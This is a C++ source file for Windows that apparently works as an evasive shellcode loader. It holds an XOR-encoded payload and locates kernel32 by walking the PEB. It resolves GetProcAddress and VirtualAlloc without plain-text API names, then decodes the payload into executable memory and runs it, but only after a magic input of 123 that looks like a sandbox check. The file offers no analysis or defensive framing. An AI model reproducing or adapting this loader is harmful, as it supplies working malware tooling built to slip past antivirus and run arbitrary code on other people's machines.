#include <Windows.h>
#include <iostream>
 
using namespace std;
 
typedef FARPROC(WINAPI* fGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* fVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
 
unsigned char buf[] = "\xb8\xac\xcb\x44\x44\x44\x24\xcd\xa1\x75\x96\x20\xcf\x16\x74\xcf\x16\x48\xcf\x16\x50\x4b\xf3\xe\x62\x75\xbb\xcf\x36\x6c\x75\x84\xe8\x78\x25\x38\x46\x68\x64\x85\x8b\x49\x45\x83\xd\x31\xab\x16\x13\xcf\x16\x54\xcf\x6\x78\x45\x94\xcf\x4\x3c\xc1\x84\x30\x8\x45\x94\xcf\xc\x5c\xcf\x1c\x64\x14\x45\x97\xc1\x8d\x30\x78\xd\xcf\x70\xcf\x45\x92\x75\xbb\x75\x84\x85\x8b\x49\xe8\x45\x83\x7c\xa4\x31\xb0\x47\x39\xbc\x7f\x39\x60\x31\xa4\x1c\xcf\x1c\x60\x45\x97\x22\xcf\x48\xf\xcf\x1c\x58\x45\x97\xcf\x40\xcf\x45\x94\xcd\x0\x60\x60\x1f\x1f\x25\x1d\x1e\x15\xbb\xa4\x1c\x1b\x1e\xcf\x56\xad\xc4\xbb\xbb\xbb\x19\x2c\x77\x76\x44\x44\x2c\x33\x37\x76\x1b\x10\x2c\x8\x33\x62\x43\xcd\xac\xbb\x94\xfc\xd4\x45\x44\x44\x6d\x80\x10\x14\x2c\x6d\xc4\x2f\x44\xbb\x91\x2e\x4e\x2c\x84\xec\xe4\xc5\x2c\x46\x44\x55\x18\xcd\xa2\x14\x14\x14\x14\x4\x14\x4\x14\x2c\xae\x4b\x9b\xa4\xbb\x91\xd3\x2e\x54\x12\x13\x2c\xdd\xe1\x30\x25\xbb\x91\xc1\x84\x30\x4e\xbb\xa\x4c\x31\xa8\xac\x23\x44\x44\x44\x2e\x44\x2e\x40\x12\x13\x2c\x46\x9d\x8c\x1b\xbb\x91\xc7\xbc\x44\x3a\x72\xcf\x72\x2e\x4\x2c\x44\x54\x44\x44\x12\x2e\x44\x2c\x1c\xe0\x17\xa1\xbb\x91\xd7\x17\x2e\x44\x12\x17\x13\x2c\x46\x9d\x8c\x1b\xbb\x91\xc7\xbc\x44\x39\x6c\x1c\x2c\x44\x4\x44\x44\x2e\x44\x14\x2c\x4f\x6b\x4b\x74\xbb\x91\x13\x2c\x31\x2a\x9\x25\xbb\x91\x1a\x1a\xbb\x48\x60\x4b\xc1\x34\xbb\xbb\xbb\xad\xdf\xbb\xbb\xbb\x45\x87\x6d\x82\x31\x85\x87\xff\xb4\xf1\xe6\x12\x2e\x44\x17\xbb\x91\x44";
size_t getKernelBase()
{
	return *(***(*((size_t*****)__readfsdword(0x30) + 3) + 7) + 2);
}
 
int main()
{
	int a;
	cin >> a;
	if (a == 123)
	{
		size_t hKernel = getKernelBase();
		PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)hKernel;
		PIMAGE_NT_HEADERS pImageNtHeader = (PIMAGE_NT_HEADERS)(pImageDosHeader->e_lfanew + hKernel);
		PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hKernel);
		size_t nameCount = pImageExportDirectory->NumberOfNames;
		size_t funcAddr = pImageExportDirectory->AddressOfFunctions + hKernel;
		size_t nameAddr = pImageExportDirectory->AddressOfNames + hKernel;
		size_t ordinal = pImageExportDirectory->AddressOfNameOrdinals + hKernel;
		fGetProcAddress fnGetProcAddress = NULL;
		for (size_t i = 0; i < nameCount; i++)
		{
			USHORT* n = (USHORT*)(*(size_t*)(nameAddr + i * 4) + hKernel);
			if (n[0] == 0x6547 && n[1] == 0x5074 && n[2] == 0x6f72 && n[3] == 0x4163 && n[4] == 0x6464 && n[5] == 0x6572 && n[6] == 0x7373)
			{
				fnGetProcAddress = (fGetProcAddress)(*(size_t*)(funcAddr + *(USHORT*)(ordinal + i * 2) * 4) + hKernel);
			}
		}
		if (fnGetProcAddress == NULL)
		{
			return 0;
		}
		size_t str1[4];
		str1[0] = 0x74726956;
		str1[1] = 0x416c6175;
		str1[2] = 0x636f6c6c;
		str1[3] = 0x0;
		fVirtualAlloc fnVirtualAlloc = (fVirtualAlloc)fnGetProcAddress((HMODULE)hKernel, (char*)str1);
		auto b = (void(*)())fnVirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		memcpy(b, buf, sizeof(buf));
		for (size_t i = 0; i < sizeof(buf); i++)
		{
			((unsigned char*)b)[i] ^= 0x44;
		}
		b();
	}
}